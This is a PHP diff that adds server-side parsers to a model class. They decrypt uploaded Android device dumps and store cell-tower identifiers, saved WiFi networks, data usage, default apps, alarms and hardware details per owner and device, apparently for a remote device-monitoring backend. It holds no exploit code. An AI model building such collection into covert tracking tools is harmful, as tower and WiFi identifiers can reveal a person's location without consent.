@@ -1479,4 +1479,661 @@ class Mod_Parse_Advanced extends Model
         }
     }
 
+    /**
+     * CellTowerScanner → tbl_cell_towers
+     * File category: cell_towers
+     * Stores neighboring cell tower information with CID, LAC, RSSI
+     */
+    public function parse_cell_towers(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+            $towers       = $json['cell_towers'] ?? [];
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_cell_towers')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            foreach ($towers as $tower) {
+                $this->db->table('tbl_cell_towers')->insert([
+                    'owner_id'         => $owner_id,
+                    'device_id'        => $device_id,
+                    'tower_type'       => $tower['type'] ?? null,
+                    'cid'              => $tower['cid'] ?? $tower['nci'] ?? $tower['base_station_id'] ?? null,
+                    'lac'              => $tower['lac'] ?? $tower['tac'] ?? $tower['network_id'] ?? null,
+                    'mcc'              => $tower['mcc'] ?? $tower['mccString'] ?? null,
+                    'mnc'              => $tower['mnc'] ?? $tower['mncString'] ?? null,
+                    'pci'              => $tower['pci'] ?? null,
+                    'nci'              => $tower['nci'] ?? null,
+                    'tac'              => $tower['tac'] ?? null,
+                    'nrarfcn'          => $tower['nrarfcn'] ?? null,
+                    'bandwidth'        => $tower['bandwidth'] ?? null,
+                    'psc'              => $tower['psc'] ?? null,
+                    'system_id'        => $tower['system_id'] ?? null,
+                    'rssi'             => $tower['rssi'] ?? null,
+                    'rsrp'             => $tower['rsrp'] ?? null,
+                    'rsrq'             => $tower['rsrq'] ?? null,
+                    'rssnr'            => $tower['rssnr'] ?? null,
+                    'cqi'              => $tower['cqi'] ?? null,
+                    'asu_level'        => $tower['asu_level'] ?? null,
+                    'csi_rsrp'         => $tower['csi_rsrp'] ?? null,
+                    'csi_rsrq'         => $tower['csi_rsrq'] ?? null,
+                    'csi_sinr'         => $tower['csi_sinr'] ?? null,
+                    'is_registered'    => isset($tower['is_registered']) ? ($tower['is_registered'] ? 1 : 0) : 0,
+                    'network_operator' => $json['network_operator'] ?? null,
+                    'network_operator_name' => $json['network_operator_name'] ?? null,
+                    'phone_type'       => $json['phone_type'] ?? null,
+                    'sim_state'        => $json['sim_state'] ?? null,
+                    'extracted_at'     => $extracted_at,
+                    'created_at'       => $dated,
+                ]);
+            }
+
+            log_message('info', '[parse_cell_towers] Inserted ' . count($towers) . ' towers for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_cell_towers] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * DisplayInfoExtractor → tbl_display_info
+     * File category: display_info
+     * Stores display metrics, resolution, density, refresh rate
+     */
+    public function parse_display_info(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_display_info')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            $displays = $json['displays'] ?? [];
+
+            $this->db->table('tbl_display_info')->insert([
+                'owner_id'          => $owner_id,
+                'device_id'         => $device_id,
+                'width_px'          => $json['width_px'] ?? null,
+                'height_px'         => $json['height_px'] ?? null,
+                'real_width'        => $json['real_width'] ?? null,
+                'real_height'       => $json['real_height'] ?? null,
+                'usable_width'      => $json['usable_width'] ?? null,
+                'usable_height'     => $json['usable_height'] ?? null,
+                'density'           => $json['density'] ?? null,
+                'density_dpi'       => $json['density_dpi'] ?? null,
+                'xdpi'              => $json['xdpi'] ?? null,
+                'ydpi'              => $json['ydpi'] ?? null,
+                'scaled_density'    => $json['scaled_density'] ?? null,
+                'rotation'          => $json['rotation'] ?? null,
+                'refresh_rate'      => $json['refresh_rate'] ?? null,
+                'mode_width'        => $json['mode_width'] ?? null,
+                'mode_height'       => $json['mode_height'] ?? null,
+                'mode_refresh_rate' => $json['mode_refresh_rate'] ?? null,
+                'displays_json'     => !empty($displays) ? json_encode($displays) : null,
+                'screen_layout'     => $json['screen_layout'] ?? null,
+                'smallest_screen_width_dp' => $json['smallest_screen_width_dp'] ?? null,
+                'ui_mode'           => $json['ui_mode'] ?? null,
+                'extracted_at'      => $extracted_at,
+                'created_at'        => $dated,
+            ]);
+
+            log_message('info', '[parse_display_info] Inserted display info for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_display_info] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * StorageExtractor → tbl_storage
+     * File category: storage
+     * Stores internal/external storage volumes
+     */
+    public function parse_storage(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+            $volumes      = $json['volumes'] ?? [];
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_storage')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            foreach ($volumes as $vol) {
+                $info = $vol['info'] ?? [];
+                $this->db->table('tbl_storage')->insert([
+                    'owner_id'       => $owner_id,
+                    'device_id'      => $device_id,
+                    'volume_path'    => $vol['path'] ?? null,
+                    'description'    => $vol['description'] ?? null,
+                    'is_removable'   => isset($vol['is_removable']) ? ($vol['is_removable'] ? 1 : 0) : 0,
+                    'state'          => $vol['state'] ?? null,
+                    'total_bytes'    => $info['total_bytes'] ?? null,
+                    'available_bytes'=> $info['available_bytes'] ?? null,
+                    'free_bytes'     => $info['free_bytes'] ?? null,
+                    'used_bytes'     => $info['used_bytes'] ?? null,
+                    'total_formatted'=> $info['total_formatted'] ?? null,
+                    'available_formatted' => $info['available_formatted'] ?? null,
+                    'used_formatted' => $info['used_formatted'] ?? null,
+                    'extracted_at'   => $extracted_at,
+                    'created_at'     => $dated,
+                ]);
+            }
+
+            // App cache and data
+            if (isset($json['app_cache'])) {
+                $this->db->table('tbl_storage')->insert([
+                    'owner_id'       => $owner_id,
+                    'device_id'      => $device_id,
+                    'volume_path'    => 'app_cache',
+                    'total_bytes'    => $json['app_cache']['total_bytes'] ?? null,
+                    'available_bytes'=> $json['app_cache']['available_bytes'] ?? null,
+                    'free_bytes'     => $json['app_cache']['free_bytes'] ?? null,
+                    'used_bytes'     => $json['app_cache']['used_bytes'] ?? null,
+                    'total_formatted'=> $json['app_cache']['total_formatted'] ?? null,
+                    'available_formatted' => $json['app_cache']['available_formatted'] ?? null,
+                    'used_formatted' => $json['app_cache']['used_formatted'] ?? null,
+                    'extracted_at'   => $extracted_at,
+                    'created_at'     => $dated,
+                ]);
+            }
+            if (isset($json['app_data'])) {
+                $this->db->table('tbl_storage')->insert([
+                    'owner_id'       => $owner_id,
+                    'device_id'      => $device_id,
+                    'volume_path'    => 'app_data',
+                    'total_bytes'    => $json['app_data']['total_bytes'] ?? null,
+                    'available_bytes'=> $json['app_data']['available_bytes'] ?? null,
+                    'free_bytes'     => $json['app_data']['free_bytes'] ?? null,
+                    'used_bytes'     => $json['app_data']['used_bytes'] ?? null,
+                    'total_formatted'=> $json['app_data']['total_formatted'] ?? null,
+                    'available_formatted' => $json['app_data']['available_formatted'] ?? null,
+                    'used_formatted' => $json['app_data']['used_formatted'] ?? null,
+                    'extracted_at'   => $extracted_at,
+                    'created_at'     => $dated,
+                ]);
+            }
+
+            log_message('info', '[parse_storage] Inserted ' . count($volumes) . ' volumes for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_storage] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * ThermalExtractor → tbl_thermal
+     * File category: thermal
+     * Stores thermal zones, CPU throttle, CPU frequencies
+     */
+    public function parse_thermal(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+            $zones        = $json['thermal_zones'] ?? [];
+            $cpu_throttle = $json['cpu_throttle'] ?? [];
+            $cpu_freqs    = $json['cpu_frequencies'] ?? [];
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_thermal')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            foreach ($zones as $zone) {
+                $this->db->table('tbl_thermal')->insert([
+                    'owner_id'     => $owner_id,
+                    'device_id'    => $device_id,
+                    'zone_name'    => $zone['zone'] ?? null,
+                    'zone_type'    => $zone['type'] ?? null,
+                    'temp_raw'     => $zone['temp_raw'] ?? null,
+                    'temp_celsius' => $zone['temp_celsius'] ?? null,
+                    'policy'       => $zone['policy'] ?? null,
+                    'data_type'    => 'thermal_zone',
+                    'extracted_at' => $extracted_at,
+                    'created_at'   => $dated,
+                ]);
+            }
+
+            foreach ($cpu_throttle as $throttle) {
+                $this->db->table('tbl_thermal')->insert([
+                    'owner_id'     => $owner_id,
+                    'device_id'    => $device_id,
+                    'cpu_name'     => $throttle['cpu'] ?? null,
+                    'core_limit_max' => $throttle['core_limit_max'] ?? null,
+                    'package_limit_max' => $throttle['package_limit_max'] ?? null,
+                    'throttle_count'   => $throttle['throttle_count'] ?? null,
+                    'data_type'    => 'cpu_throttle',
+                    'extracted_at' => $extracted_at,
+                    'created_at'   => $dated,
+                ]);
+            }
+
+            foreach ($cpu_freqs as $freq) {
+                $this->db->table('tbl_thermal')->insert([
+                    'owner_id'         => $owner_id,
+                    'device_id'        => $device_id,
+                    'cpu_name'         => $freq['cpu'] ?? null,
+                    'scaling_min_freq' => $freq['scaling_min_freq'] ?? null,
+                    'scaling_max_freq' => $freq['scaling_max_freq'] ?? null,
+                    'scaling_cur_freq' => $freq['scaling_cur_freq'] ?? null,
+                    'scaling_governor' => $freq['scaling_governor'] ?? null,
+                    'data_type'        => 'cpu_frequency',
+                    'extracted_at'     => $extracted_at,
+                    'created_at'       => $dated,
+                ]);
+            }
+
+            log_message('info', '[parse_thermal] Inserted thermal data for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_thermal] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * NfcExtractor → tbl_nfc
+     * File category: nfc
+     * Stores NFC adapter state and features
+     */
+    public function parse_nfc(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_nfc')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            $this->db->table('tbl_nfc')->insert([
+                'owner_id'           => $owner_id,
+                'device_id'          => $device_id,
+                'nfc_available'      => isset($json['nfc_available']) ? ($json['nfc_available'] ? 1 : 0) : 0,
+                'nfc_supported'      => isset($json['nfc_supported']) ? ($json['nfc_supported'] ? 1 : 0) : 0,
+                'nfc_enabled'        => isset($json['nfc_enabled']) ? ($json['nfc_enabled'] ? 1 : 0) : 0,
+                'nfc_secure_nfc'     => isset($json['nfc_secure_nfc']) ? ($json['nfc_secure_nfc'] ? 1 : 0) : 0,
+                'nfc_secure_supported' => isset($json['nfc_secure_nfc_supported']) ? ($json['nfc_secure_nfc_supported'] ? 1 : 0) : 0,
+                'features_json'      => isset($json['nfc_features']) ? json_encode($json['nfc_features']) : null,
+                'extracted_at'       => $extracted_at,
+                'created_at'         => $dated,
+            ]);
+
+            log_message('info', '[parse_nfc] Inserted NFC info for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_nfc] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * DataUsageExtractor → tbl_data_usage
+     * File category: data_usage
+     * Stores per-network mobile/WiFi data usage
+     */
+    public function parse_data_usage(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+            $records      = $json['usage_records'] ?? [];
+            $totals       = $json['totals'] ?? [];
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_data_usage')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            foreach ($records as $rec) {
+                $this->db->table('tbl_data_usage')->insert([
+                    'owner_id'      => $owner_id,
+                    'device_id'     => $device_id,
+                    'network_type'  => $rec['network_type'] ?? null,
+                    'sub_id'        => $rec['sub_id'] ?? null,
+                    'is_wifi'       => isset($rec['is_wifi']) ? ($rec['is_wifi'] ? 1 : 0) : 0,
+                    'rx_bytes'      => $rec['rx_bytes'] ?? null,
+                    'tx_bytes'      => $rec['tx_bytes'] ?? null,
+                    'total_bytes'   => $rec['total_bytes'] ?? null,
+                    'rx_formatted'  => $rec['rx_formatted'] ?? null,
+                    'tx_formatted'  => $rec['tx_formatted'] ?? null,
+                    'bucket_start'  => $rec['bucket_start'] ?? null,
+                    'bucket_end'    => $rec['bucket_end'] ?? null,
+                    'extracted_at'  => $extracted_at,
+                    'created_at'    => $dated,
+                ]);
+            }
+
+            // Store totals
+            if (!empty($totals)) {
+                $this->db->table('tbl_data_usage')->insert([
+                    'owner_id'      => $owner_id,
+                    'device_id'     => $device_id,
+                    'network_type'  => 'total',
+                    'is_wifi'       => 0,
+                    'rx_bytes'      => $totals['total_rx'] ?? null,
+                    'tx_bytes'      => $totals['total_tx'] ?? null,
+                    'total_bytes'   => ($totals['total_rx'] ?? 0) + ($totals['total_tx'] ?? 0),
+                    'rx_formatted'  => $totals['total_rx_formatted'] ?? null,
+                    'tx_formatted'  => $totals['total_tx_formatted'] ?? null,
+                    'extracted_at'  => $extracted_at,
+                    'created_at'    => $dated,
+                ]);
+            }
+
+            log_message('info', '[parse_data_usage] Inserted ' . count($records) . ' usage records for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_data_usage] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * SavedWifiExtractor → tbl_saved_wifi
+     * File category: saved_wifi
+     * Stores configured/saved WiFi networks
+     */
+    public function parse_saved_wifi(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+            $networks     = $json['saved_networks'] ?? [];
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_saved_wifi')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            foreach ($networks as $net) {
+                $this->db->table('tbl_saved_wifi')->insert([
+                    'owner_id'       => $owner_id,
+                    'device_id'      => $device_id,
+                    'ssid'           => $net['ssid'] ?? null,
+                    'bssid'          => $net['bssid'] ?? null,
+                    'network_id'     => $net['network_id'] ?? null,
+                    'priority'       => $net['priority'] ?? null,
+                    'status'         => $net['status'] ?? null,
+                    'is_hidden'      => isset($net['is_hidden']) ? ($net['is_hidden'] ? 1 : 0) : 0,
+                    'security'       => $net['security'] ?? null,
+                    'protocols_json' => isset($net['protocols']) ? json_encode($net['protocols']) : null,
+                    'auth_algorithms_json' => isset($net['auth_algorithms']) ? json_encode($net['auth_algorithms']) : null,
+                    'extracted_at'   => $extracted_at,
+                    'created_at'     => $dated,
+                ]);
+            }
+
+            log_message('info', '[parse_saved_wifi] Inserted ' . count($networks) . ' saved WiFi networks for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_saved_wifi] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * DefaultAppsExtractor → tbl_default_apps
+     * File category: default_apps
+     * Stores default browser, dialer, SMS, launcher, etc.
+     */
+    public function parse_default_apps(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_default_apps')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            $handlerFields = [
+                'default_browser' => 'browser',
+                'default_dialer'  => 'dialer',
+                'default_sms'     => 'sms',
+                'default_launcher'=> 'launcher',
+                'default_email'   => 'email',
+                'default_maps'    => 'maps',
+                'default_music'   => 'music',
+                'default_gallery' => 'gallery',
+                'default_browser_app' => 'browser_app',
+            ];
+
+            foreach ($handlerFields as $jsonKey => $handlerType) {
+                $app = $json[$jsonKey] ?? [];
+                if (!empty($app) && is_array($app) && isset($app['package_name'])) {
+                    $this->db->table('tbl_default_apps')->insert([
+                        'owner_id'     => $owner_id,
+                        'device_id'    => $device_id,
+                        'handler_type' => $handlerType,
+                        'package_name' => $app['package_name'] ?? null,
+                        'app_name'     => $app['app_name'] ?? null,
+                        'is_system'    => isset($app['is_system']) ? ($app['is_system'] ? 1 : 0) : 0,
+                        'extracted_at' => $extracted_at,
+                        'created_at'   => $dated,
+                    ]);
+                }
+            }
+
+            if (isset($json['default_sms_package'])) {
+                $this->db->table('tbl_default_apps')->insert([
+                    'owner_id'     => $owner_id,
+                    'device_id'    => $device_id,
+                    'handler_type' => 'sms_package',
+                    'package_name' => $json['default_sms_package'] ?? null,
+                    'extracted_at' => $extracted_at,
+                    'created_at'   => $dated,
+                ]);
+            }
+
+            log_message('info', '[parse_default_apps] Inserted default apps for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_default_apps] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * AlarmsExtractor → tbl_alarms
+     * File category: alarms
+     * Stores JobScheduler jobs and AlarmManager alarms
+     */
+    public function parse_alarms(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+            $jobs         = $json['scheduled_jobs'] ?? [];
+            $alarms       = $json['alarm_clocks'] ?? [];
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_alarms')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            foreach ($jobs as $job) {
+                $this->db->table('tbl_alarms')->insert([
+                    'owner_id'           => $owner_id,
+                    'device_id'          => $device_id,
+                    'alarm_type'         => 'job',
+                    'job_id'             => $job['job_id'] ?? null,
+                    'service_class'      => $job['service'] ?? null,
+                    'package_name'       => $job['package'] ?? null,
+                    'is_periodic'        => isset($job['is_periodic']) ? ($job['is_periodic'] ? 1 : 0) : 0,
+                    'interval_millis'    => $job['interval_millis'] ?? null,
+                    'min_flex_millis'    => $job['min_flex_millis'] ?? null,
+                    'requires_charging'  => isset($job['requires_charging']) ? ($job['requires_charging'] ? 1 : 0) : 0,
+                    'requires_idle'      => isset($job['requires_idle']) ? ($job['requires_idle'] ? 1 : 0) : 0,
+                    'network_type'       => $job['network_type'] ?? null,
+                    'persisted'          => isset($job['persisted']) ? ($job['persisted'] ? 1 : 0) : 0,
+                    'initial_delay_millis' => $job['initial_delay_millis'] ?? null,
+                    'minimum_latency_millis' => $job['minimum_latency_millis'] ?? null,
+                    'important_foreground' => isset($job['important_while_foreground']) ? ($job['important_while_foreground'] ? 1 : 0) : 0,
+                    'extracted_at'       => $extracted_at,
+                    'created_at'         => $dated,
+                ]);
+            }
+
+            foreach ($alarms as $alarm) {
+                $this->db->table('tbl_alarms')->insert([
+                    'owner_id'     => $owner_id,
+                    'device_id'    => $device_id,
+                    'alarm_type'   => 'alarm_clock',
+                    'trigger_time' => $alarm['trigger_time_millis'] ?? null,
+                    'trigger_time_formatted' => $alarm['trigger_time_formatted'] ?? null,
+                    'package_name' => $alarm['package'] ?? null,
+                    'extracted_at' => $extracted_at,
+                    'created_at'   => $dated,
+                ]);
+            }
+
+            log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . count($alarms) . ' alarms for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_alarms] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
 }
